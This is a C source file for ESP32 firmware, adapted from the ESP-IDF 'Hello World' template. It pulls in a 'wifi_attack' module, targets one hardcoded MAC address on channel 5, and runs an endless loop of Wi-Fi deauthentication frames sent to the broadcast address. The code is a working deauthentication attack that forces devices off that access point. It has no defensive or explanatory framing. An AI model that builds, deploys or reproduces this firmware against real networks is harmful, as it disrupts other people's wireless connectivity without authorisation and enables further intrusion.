/* Hello World Example

   This example code is in the Public Domain (or CC0 licensed, at your option.)

   Unless required by applicable law or agreed to in writing, this
   software is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
   CONDITIONS OF ANY KIND, either express or implied.
*/
#include <stdio.h>
#include "sdkconfig.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_spi_flash.h"
#include "esp_vfs_fat.h"
#include "nvs_flash.h"
#include "wifi_attack.h"

static const char* TAG = "MAIN";
// Handle of the wear levelling library instance
static wl_handle_t s_wl_handle = WL_INVALID_HANDLE;
// Mount path for the partition
const char *base_path = "/fat";

/*
* Print memory debug information
*/
static void print_free_heap(void *args){
    while(true){
        ESP_EARLY_LOGI("MEM", "Free heap size: %d\tMin free heap: %d.", esp_get_free_heap_size(), esp_get_minimum_free_heap_size());
        //ESP_EARLY_LOGI("MEM", "FIRMWARE AGGIORNATO DIOCANE!!!.");
        fflush(stdout);
        vTaskDelay(5000 / portTICK_PERIOD_MS);
    }
}

static unsigned char filter_mac[] = { 0x80, 0x16, 0x05, 0x74, 0x28, 0x41 };
static unsigned char broadcast[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

void app_main(void)
{
    nvs_flash_init();
    set_filter_enable(filter_mac, true);
    wifi_attack_init();
    set_channel(5);
    //xTaskCreate(&print_free_heap, "print_free_heap", 4096, NULL, 6, NULL);
    // To mount device we need name of device partition, define base_path
    // and allow format partition in case if it is new one and was not formated before
    const esp_vfs_fat_mount_config_t mount_config = {
        .max_files = 20,
        .format_if_mount_failed = true,
        .allocation_unit_size = CONFIG_WL_SECTOR_SIZE
    };
    esp_err_t err = esp_vfs_fat_spiflash_mount(base_path, "storage", &mount_config, &s_wl_handle);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to mount FATFS (%s)", esp_err_to_name(err));
        return NULL;
    }
    ESP_LOGI(TAG, "Mounted FATFS");

    while(true)
    {
        SendDeauth(broadcast, filter_mac, 7);
        SendDeauth(broadcast, filter_mac, 7);
        SendDeauth(broadcast, filter_mac, 7);
        SendDeauth(broadcast, filter_mac, 7);
        SendDeauth(broadcast, filter_mac, 7);
        SendDeauth(broadcast, filter_mac, 7);
        vTaskDelay( 500000 / portTICK_PERIOD_MS);
    }
    
    esp_restart();
}